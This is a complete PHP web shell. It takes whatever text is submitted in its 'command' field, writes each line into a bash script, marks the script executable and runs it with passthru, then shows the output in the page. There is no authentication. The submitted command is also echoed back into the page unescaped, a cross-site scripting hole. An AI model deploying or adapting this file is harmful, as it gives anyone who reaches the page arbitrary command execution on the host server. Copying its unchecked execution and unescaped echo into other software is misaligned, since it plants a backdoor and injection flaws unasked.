<? 

  function un_magic_quote( $text )
  {
    if ( get_magic_quotes_gpc() == 1)
      return stripslashes($text);
    else
      return $text;
  }


  function write_script($fsp, $text)
  {
    $array = split("\n",$text);
    $out = fopen($fsp, "w");
    fwrite($out,'#!/bin/bash'."\n");
    fwrite($out,'cd ..'."\n");
    foreach ($array as $line)
      if (!empty($line))
      {
        fwrite($out, "echo '<hr noshade size=1><font color=red>".trim($line)."</font><hr size=1 noshade>'\n");
        fwrite($out, trim($line)."\n" );
      }
    fclose($out);
    chmod($fsp,0755);
  }
  
  set_time_limit(86400); 
  $cmd = un_magic_quote($_REQUEST["command"]);
?>

<html>
<body onload="document.forms[0].elements[0].focus();">
<form method="post">
<p>
<table width="100%" cellspacing=4>
  <tr>
    <td width=""></td>
    <td></td>
  </tr>

  <tr>
    <td style="padding:4 8 0 0;" valign=top align=right> Command :  </td>
    <td><textarea rows="6" cols="60" name="command"><? echo $cmd; ?></textarea></td>
  </tr>
  <tr>
    <td></td>
    <td><input type="submit" value="Submit"></td>
  </tr>
</table><pre>
<?
  write_script("_script.sh",$cmd);
  passthru('/bin/bash _script.sh 2>&1');
  //unlink("_script.sh");
  
?>
</pre>
</body>
</html>